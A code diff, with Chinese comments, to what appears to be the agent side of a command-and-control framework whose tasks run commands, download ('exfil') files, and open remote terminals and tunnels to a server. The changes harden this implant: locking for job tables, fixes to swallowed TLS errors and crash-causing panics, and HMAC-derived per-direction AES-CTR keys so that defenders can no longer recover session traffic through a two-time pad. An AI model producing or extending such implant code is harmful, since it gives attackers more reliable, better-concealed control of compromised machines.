@@ -5,7 +5,9 @@ import (
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/hmac"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
 	"errors"
@@ -31,9 +33,105 @@ var JOBS map[string]utils.Connection
 var TUNNELS sync.Map
 var TERMINALS sync.Map
 
+// ★ DOWNLOADS / JOBS 会被任务协程写（下载/作业跑起来后 delete 自己）、又被新到的
+// 任务读（`job list` 遍历、`job kill` 查表）。裸 map 一旦并发读写就是
+// `fatal error: concurrent map read and map write` —— **Go 运行时直接终止进程，
+// recover 也接不住**，现场表现是"agent 莫名掉线"。
+// 这把锁只护 map 本身；`JobCancel` / `HandleCancel` 会在别处回调，**绝不持锁调用**
+// （否则死锁）。
+var jobsMu sync.Mutex
+
+func jobsSetDownload(id string, c utils.Connection) {
+	jobsMu.Lock()
+	DOWNLOADS[id] = c
+	jobsMu.Unlock()
+}
+
+func jobsDelDownload(id string) {
+	jobsMu.Lock()
+	delete(DOWNLOADS, id)
+	jobsMu.Unlock()
+}
+
+func jobsSetJob(id string, c utils.Connection) {
+	jobsMu.Lock()
+	JOBS[id] = c
+	jobsMu.Unlock()
+}
+
+func jobsDelJob(id string) {
+	jobsMu.Lock()
+	delete(JOBS, id)
+	jobsMu.Unlock()
+}
+
+// jobsSnapshot 在锁内把两张表拷成切片，把遍历留给调用方。
+func jobsSnapshot() []utils.JobInfo {
+	jobsMu.Lock()
+	defer jobsMu.Unlock()
+
+	jobList := make([]utils.JobInfo, 0, len(DOWNLOADS)+len(JOBS))
+	for k, v := range DOWNLOADS {
+		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
+	}
+	for k, v := range JOBS {
+		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
+	}
+	return jobList
+}
+
+func jobsLookup(id string) (utils.Connection, bool) {
+	jobsMu.Lock()
+	defer jobsMu.Unlock()
+
+	if c, ok := DOWNLOADS[id]; ok {
+		return c, true
+	}
+	c, ok := JOBS[id]
+	return c, ok
+}
+
 type TunnelController struct {
 	Cancel context.CancelFunc
 	Paused atomic.Bool
+}
+
+// ─────────────────── 方向密钥派生（消除 two-time pad）───────────────────
+//
+// 缺陷：enc 与 dec 原先共用同一对 (key, iv) ⇒ AES-CTR 两个方向产生**同一段密钥流**：
+//
+//	C(server→agent) ⊕ C(agent→server) = P(server→agent) ⊕ P(agent→server)
+//
+// 即 two-time pad。终端会话里 s→a 是操作员键入、a→s 是 shell 回显，两者异或直接还原；
+// 而 shell 提示符高度可预测 ⇒ 已知一侧明文即可解出另一侧。隧道同理。
+//
+// 修法：由同一 (key, iv) 用 HMAC-SHA256 作 KDF，派生出**两个计算上无关**的方向密钥。
+//   ★ 为什么不是"给其中一个方向换个 iv"：CTR 下同 key、iv 仅差若干比特仍产生**相关**
+//     密钥流，已知明文下可恢复；HMAC-SHA256 的输出没有这种结构。
+//   ★ 为什么不动线格式：(key, iv) 仍原样走 initMsg ⇒ 协商格式零变化，两端各自本地派生。
+//     但**两端必须同批上线** —— 只改一侧，该侧就解不出对侧（现象：隧道/终端一连就乱码）。
+//
+// ★★ 本函数在**两棵树里各有一份**，必须逐字节等价：
+//      listener: extenders/gopher_listener_tcp/pl_transport.go
+//      agent   : extenders/gopher_agent/src_gopher/tasks.go   ← 本文件与之等价
+//
+// ★★ 标签按**线路方向**命名，不按本地变量名 —— 两端的 enc/dec 与方向的对应是**相反**的：
+//      server→agent : listener 用 encStream，agent 用 decStream
+//      agent→server : listener 用 decStream，agent 用 encStream
+//    按方向命名，是为了避开"照本地变量名对齐"这个几乎必然会犯的错。
+
+const (
+	axKeyLabelTunS2A  = "axc2/tunnel/s2a/v1"
+	axKeyLabelTunA2S  = "axc2/tunnel/a2s/v1"
+	axKeyLabelTermS2A = "axc2/terminal/s2a/v1"
+	axKeyLabelTermA2S = "axc2/terminal/a2s/v1"
+)
+
+func axDirKey(key, iv []byte, label string) []byte {
+	h := hmac.New(sha256.New, key)
+	h.Write([]byte(label))
+	h.Write(iv)
+	return h.Sum(nil)
 }
 
 func TaskProcess(commands [][]byte) [][]byte {
@@ -258,13 +356,7 @@ func taskExit() ([]byte, error) {
 
 func taskJobList() ([]byte, error) {
 
-	var jobList []utils.JobInfo
-	for k, v := range DOWNLOADS {
-		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
-	}
-	for k, v := range JOBS {
-		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
-	}
+	jobList := jobsSnapshot()
 
 	list, _ := msgpack.Marshal(jobList)
 
@@ -278,12 +370,9 @@ func taskJobKill(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	job, ok := DOWNLOADS[params.Id]
+	job, ok := jobsLookup(params.Id)
 	if !ok {
-		job, ok = JOBS[params.Id]
-		if !ok {
-			return nil, fmt.Errorf("job '%s' not found", params.Id)
-		}
+		return nil, fmt.Errorf("job '%s' not found", params.Id)
 	}
 
 	if job.JobCancel != nil {
@@ -755,7 +844,9 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 	if profile.UseSSL {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
-			return nil, err
+			// ★ 原为 `return nil, err`：此刻 err 必为 nil ⇒ 返回 (nil, nil)，
+			// 证书错误被吞掉、下游当成"空响应成功"。
+			return nil, certerr
 		}
 
 		caCertPool := x509.NewCertPool()
@@ -783,13 +874,13 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		Conn:     conn,
 	}
 	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
-	DOWNLOADS[strFileId] = connection
+	jobsSetDownload(strFileId, connection)
 
 	go func() {
 		defer func() {
 			connection.HandleCancel()
 			_ = conn.Close()
-			delete(DOWNLOADS, strFileId)
+			jobsDelDownload(strFileId)
 		}()
 
 		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
@@ -895,7 +986,8 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
 			procCancel()
-			return nil, err
+			// ★ 同 :805 —— 原先是 `return nil, err`（err 为 nil），证书错误被吞。
+			return nil, certerr
 		}
 
 		caCertPool := x509.NewCertPool()
@@ -922,14 +1014,14 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		JobCancel: procCancel,
 	}
 	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
-	JOBS[params.Task] = connection
+	jobsSetJob(params.Task, connection)
 
 	go func() {
 		defer func() {
 			procCancel()
 			connection.HandleCancel()
 			_ = conn.Close()
-			delete(JOBS, params.Task)
+			jobsDelJob(params.Task)
 		}()
 
 		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
@@ -1007,7 +1099,9 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		done := make(chan struct{})
 		var lastOutLen, lastErrLen int
 		const maxChunkSize = 0x10000 // 65 Kb
+		wg.Add(1)                    // ★ ticker 协程也入 wg，收尾才能确保它已停
 		go func() {
+			defer wg.Done()
 			ticker := time.NewTicker(1 * time.Second)
 			defer ticker.Stop()
 			for {
@@ -1064,8 +1158,12 @@ func jobRun(paramsData []byte) ([]byte, error) {
 
 		time.Sleep(200 * time.Millisecond)
 		err = cmd.Wait()
-		wg.Wait()
+		// ★ 顺序不能反：先 close(done) 让 ticker 协程退出，再 wg.Wait() 收它。
+		// 反过来（wg.Wait() 在前）就是**死锁** —— ticker 只在 done 关闭时才返回。
+		// 原先 ticker 根本没入 wg ⇒ 下面读 lastOutLen/lastErrLen 时它可能还在跑，
+		// 两边同时改这两个计数器：轻则同一段输出重发/漏发，重则数据竞争。
 		close(done)
+		wg.Wait()
 
 		stdoutMu.Lock()
 		finalOut := stdoutBuf.String()
@@ -1159,10 +1257,12 @@ func jobTunnel(paramsData []byte) {
 				if opErr.Timeout() {
 					reason = 4
 				}
-				if errors.Is(syscall.ECONNREFUSED, opErr.Err) {
+				// ★ errors.Is 的实参顺序原先写反了：`errors.Is(syscall.ECONNREFUSED, opErr.Err)`
+				// 把哨兵值当 err、把实际错误当 target ⇒ 恒 false ⇒ reason 永远停在 0/4。
+				if errors.Is(opErr.Err, syscall.ECONNREFUSED) {
 					reason = 5
 				}
-				if errors.Is(syscall.ENETUNREACH, opErr.Err) {
+				if errors.Is(opErr.Err, syscall.ENETUNREACH) {
 					reason = 3
 				}
 			}
@@ -1189,7 +1289,13 @@ func jobTunnel(paramsData []byte) {
 			srvConn, err = net.Dial("tcp", profile.Addresses[0])
 		}
 		if err != nil {
-			srvConn.Close()
+			// ★ 原为 `srvConn.Close()`：Dial 失败时 srvConn 仍是 nil 接口，
+			// 调 Close() 直接空指针 panic ⇒ **整个 agent 进程退出**。
+			// 终端那条路径本来就是对的（只清理已存在的东西），这里同理：
+			// clientConn 可能已经连上（失败的是到服务端那段），要收掉，避免漏 fd。
+			if clientConn != nil {
+				_ = clientConn.Close()
+			}
 			return
 		}
 
@@ -1219,11 +1325,22 @@ func jobTunnel(paramsData []byte) {
 			return
 		}
 
-		encCipher, _ := aes.NewCipher(tunKey)
+		// ★ 两方向**必须**各用派生的密钥。enc 发往服务端 ⇒ a2s；dec 收自服务端 ⇒ s2a。
+		// ★ 顺带把 aes.NewCipher 的 error 从 `_` 改成检查（密钥长度恒为 16，实际不会失败）。
+		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunA2S))
+		if err != nil {
+			_ = srvConn.Close()
+			_ = clientConn.Close()
+			return
+		}
 		encStream := cipher.NewCTR(encCipher, tunIv)
 		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
 
-		decCipher, _ := aes.NewCipher(tunKey)
+		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunS2A))
+		if err != nil {
+			_ = srvConn.Close()
+			return
+		}
 		decStream := cipher.NewCTR(decCipher, tunIv)
 		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
 
@@ -1371,11 +1488,20 @@ func jobTerminal(paramsData []byte) {
 			return
 		}
 
-		encCipher, _ := aes.NewCipher(tunKey)
+		// ★ 终端同理：enc = agent→server（a2s），dec = server→agent（s2a）。
+		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermA2S))
+		if err != nil {
+			_ = srvConn.Close()
+			return
+		}
 		encStream := cipher.NewCTR(encCipher, tunIv)
 		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
 
-		decCipher, _ := aes.NewCipher(tunKey)
+		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermS2A))
+		if err != nil {
+			_ = srvConn.Close()
+			return
+		}
 		decStream := cipher.NewCTR(decCipher, tunIv)
 		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
 
